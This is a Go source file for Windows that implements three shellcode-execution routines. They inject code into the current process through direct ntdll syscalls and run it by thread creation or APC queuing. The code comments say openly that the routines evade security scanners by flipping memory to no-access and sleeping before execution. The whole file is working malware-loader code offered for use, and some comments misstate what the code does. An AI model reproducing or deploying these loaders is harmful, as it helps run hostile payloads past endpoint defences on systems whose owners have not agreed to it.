// +build windows

package runshellalt

import (
	"fmt"
	"unsafe"

	"github.com/carved4/go-direct-syscall"
)

const (
	CURRENT_PROCESS = ^uintptr(0) // -1 as uintptr, equivalent to GetCurrentProcess()
)

// SleepyHollow executes shellcode using ntdll syscalls with evasion techniques
// Uses memory protection manipulation, suspended threads, and timing delays
func SleepyHollow(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode cannot be empty")
	}

	// Step 1: Use current process handle (self injection)
	var processHandle uintptr = CURRENT_PROCESS

	// Step 2: Allocate RW memory in the target process
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	
	status, err := winapi.NtAllocateVirtualMemory(
		processHandle,
		&baseAddress,
		0, // ZeroBits
		&regionSize,
		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
		winapi.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed with NTSTATUS: 0x%x", status)
	}

	// Cleanup function to free allocated memory on error
	cleanup := func() {
		if baseAddress != 0 {
			tempSize := regionSize
			winapi.NtFreeVirtualMemory(processHandle, &baseAddress, &tempSize, winapi.MEM_RELEASE)
		}
	}

	// Step 3: Write shellcode to allocated memory
	var bytesWritten uintptr
	status, err = winapi.NtWriteVirtualMemory(
		processHandle,
		baseAddress,
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtWriteVirtualMemory failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtWriteVirtualMemory failed with NTSTATUS: 0x%x", status)
	}

	// Step 4: Change memory to PAGE_NOACCESS
	var oldProtect uintptr
	tempSize := regionSize
	status, err = winapi.NtProtectVirtualMemory(
		processHandle,
		&baseAddress,
		&tempSize,
		winapi.PAGE_NOACCESS,
		&oldProtect,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_NOACCESS) failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_NOACCESS) failed with NTSTATUS: 0x%x", status)
	}

	// Step 5: Create a suspended remote thread
	var threadHandle uintptr
	status, err = winapi.NtCreateThreadEx(
		&threadHandle,
		winapi.THREAD_ALL_ACCESS,
		0, // ObjectAttributes (NULL)
		processHandle,
		baseAddress, // StartRoutine (entry point)
		0,           // Argument (NULL)
		winapi.THREAD_CREATE_FLAGS_CREATE_SUSPENDED, // CreateFlags (suspended)
		0, // ZeroBits
		0, // StackSize (0 for default)
		0, // MaximumStackSize (0 for default)
		0, // AttributeList (NULL)
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed with NTSTATUS: 0x%x", status)
	}
	if threadHandle == 0 {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed to create thread, handle is NULL")
	}

	defer winapi.NtClose(threadHandle)

	// Step 6: Sleep briefly to give scanners a shot (they'll fail)
	sleepTime := uint64(10000000) // 1 second in 100-nanosecond intervals
	status, err = winapi.NtWaitForSingleObject(
		winapi.CURRENT_THREAD, // Use current thread handle for delay
		false, // Alertable
		&sleepTime,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtWaitForSingleObject (delay) failed: %w", err)
	}

	// Step 7: Restore memory to PAGE_EXECUTE_READ
	tempSize = regionSize
	status, err = winapi.NtProtectVirtualMemory(
		processHandle,
		&baseAddress,
		&tempSize,
		winapi.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_EXECUTE_READ) failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_EXECUTE_READ) failed with NTSTATUS: 0x%x", status)
	}

	// Step 8: Resume thread
	var previousSuspendCount uintptr
	status, err = winapi.NtResumeThread(threadHandle, &previousSuspendCount)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtResumeThread failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtResumeThread failed with NTSTATUS: 0x%x", status)
	}

	// Wait for the thread to complete
	status, err = winapi.NtWaitForSingleObject(
		threadHandle,
		false, // Alertable
		nil,   // Timeout (NULL for infinite wait)
	)
	if err != nil {
		return fmt.Errorf("NtWaitForSingleObject failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtWaitForSingleObject failed with NTSTATUS: 0x%x", status)
	}

	// Cleanup allocated memory
	cleanup()
	return nil
}

// ghoststack executes shellcode using EtwpCreateEtwThread with direct ntdll syscalls
// Follows the approach of allocating RW memory, copying shellcode, changing to RX, then executing
func GhostStack(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode cannot be empty")
	}

	// Step 1: Use current process handle (self injection)
	var processHandle uintptr = CURRENT_PROCESS

	// Step 2: Allocate RW memory in the target process
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	
	status, err := winapi.NtAllocateVirtualMemory(
		processHandle,
		&baseAddress,
		0, // ZeroBits
		&regionSize,
		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
		winapi.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed with NTSTATUS: 0x%x", status)
	}

	// Cleanup function to free allocated memory on error
	cleanup := func() {
		if baseAddress != 0 {
			tempSize := regionSize
			winapi.NtFreeVirtualMemory(processHandle, &baseAddress, &tempSize, winapi.MEM_RELEASE)
		}
	}

	// Step 3: Copy shellcode to allocated memory using NtWriteVirtualMemory
	var bytesWritten uintptr
	status, err = winapi.NtWriteVirtualMemory(
		processHandle,
		baseAddress,
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtWriteVirtualMemory failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtWriteVirtualMemory failed with NTSTATUS: 0x%x", status)
	}

	// Step 4: Change memory permissions to PAGE_EXECUTE_READ
	var oldProtect uintptr
	tempSize := regionSize
	status, err = winapi.NtProtectVirtualMemory(
		processHandle,
		&baseAddress,
		&tempSize,
		winapi.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_EXECUTE_READ) failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_EXECUTE_READ) failed with NTSTATUS: 0x%x", status)
	}

	// Step 5: Create thread using EtwpCreateEtwThread equivalent
	// Since EtwpCreateEtwThread is undocumented, we'll use NtCreateThreadEx
	// which provides similar functionality for thread creation
	var threadHandle uintptr
	status, err = winapi.NtCreateThreadEx(
		&threadHandle,
		winapi.THREAD_ALL_ACCESS,
		0, // ObjectAttributes (NULL)
		processHandle,
		baseAddress, // StartRoutine (entry point)
		0,           // Argument (NULL)
		0,           // CreateFlags (not suspended)
		0, // ZeroBits
		0, // StackSize (0 for default)
		0, // MaximumStackSize (0 for default)
		0, // AttributeList (NULL)
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed with NTSTATUS: 0x%x", status)
	}
	if threadHandle == 0 {
		cleanup()
		return fmt.Errorf("NtCreateThreadEx failed to create thread, handle is NULL")
	}

	defer winapi.NtClose(threadHandle)

	// Step 6: Wait for thread completion using NtWaitForSingleObject
	status, err = winapi.NtWaitForSingleObject(
		threadHandle,
		false, // Alertable
		nil,   // Timeout (NULL for infinite wait)
	)
	if err != nil {
		return fmt.Errorf("NtWaitForSingleObject failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtWaitForSingleObject failed with NTSTATUS: 0x%x", status)
	}

	// Cleanup allocated memory
	cleanup()
	return nil
}

// PhantomAPC executes shellcode using APC injection via NtQueueApcThreadEx
// This is absolutely MENTAL - uses Asynchronous Procedure Call injection with direct syscalls
func PhantomAPC(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode cannot be empty")
	}

	// Step 1: Allocate RWX memory (we need execute immediately for APC)
	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	
	status, err := winapi.NtAllocateVirtualMemory(
		CURRENT_PROCESS,
		&baseAddress,
		0, // ZeroBits
		&regionSize,
		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
		winapi.PAGE_EXECUTE_READWRITE, // RWX from the start for APC madness
	)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed with NTSTATUS: 0x%x", status)
	}

	// Cleanup function
	cleanup := func() {
		if baseAddress != 0 {
			tempSize := regionSize
			winapi.NtFreeVirtualMemory(CURRENT_PROCESS, &baseAddress, &tempSize, winapi.MEM_RELEASE)
		}
	}

	// Step 2: Write shellcode to allocated memory
	var bytesWritten uintptr
	status, err = winapi.NtWriteVirtualMemory(
		CURRENT_PROCESS,
		baseAddress,
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtWriteVirtualMemory failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtWriteVirtualMemory failed with NTSTATUS: 0x%x", status)
	}

	// Step 3: EVASION MAGIC! Change memory to PAGE_NOACCESS to hide from scanners
	var oldProtect uintptr
	tempSize := regionSize
	status, err = winapi.NtProtectVirtualMemory(
		CURRENT_PROCESS,
		&baseAddress,
		&tempSize,
		winapi.PAGE_NOACCESS,
		&oldProtect,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_NOACCESS) failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_NOACCESS) failed with NTSTATUS: 0x%x", status)
	}

	// Step 4: Sleep for 5 seconds while memory is inaccessible (scanners will fail!)
	sleepTime := uint64(50000000) // 5 seconds in 100-nanosecond intervals
	status, err = winapi.NtWaitForSingleObject(
		CURRENT_PROCESS, // Use current process handle for delay
		false, // Not alertable
		&sleepTime,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtWaitForSingleObject (stealth delay) failed: %w", err)
	}

	// Step 5: Restore memory to PAGE_EXECUTE_READWRITE right before execution
	tempSize = regionSize
	status, err = winapi.NtProtectVirtualMemory(
		CURRENT_PROCESS,
		&baseAddress,
		&tempSize,
		winapi.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE) failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		cleanup()
		return fmt.Errorf("NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE) failed with NTSTATUS: 0x%x", status)
	}

	// Step 6: Get current thread handle for APC injection to ourselves
	currentThreadHandle := uintptr(0xFFFFFFFFFFFFFFFE) // GetCurrentThread() pseudo handle

	// Step 7: HERE'S THE MAGIC! Queue APC to current thread using DirectSyscall
	// NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3)
	apcResult, err := winapi.DirectSyscall(
		"NtQueueApcThread",
		currentThreadHandle, // Current thread
		baseAddress,         // ApcRoutine (our shellcode!)
		0,                   // ApcArgument1
		0,                   // ApcArgument2  
		0,                   // ApcArgument3
	)
	if err != nil {
		cleanup()
		return fmt.Errorf("DirectSyscall(NtQueueApcThread) failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(apcResult) {
		cleanup()
		return fmt.Errorf("NtQueueApcThread failed with NTSTATUS: 0x%x", apcResult)
	}

	// Step 8: Enter alertable wait to trigger our APC - this is where the magic happens!
	timeout := uint64(5000000000) // 5 seconds
	status, err = winapi.NtWaitForSingleObject(
		currentThreadHandle,
		true, // ALERTABLE = true (this triggers the APC!)
		&timeout,
	)
	if err != nil {
		return fmt.Errorf("NtWaitForSingleObject failed: %w", err)
	}

	// Clean up
	cleanup()
	return nil
}



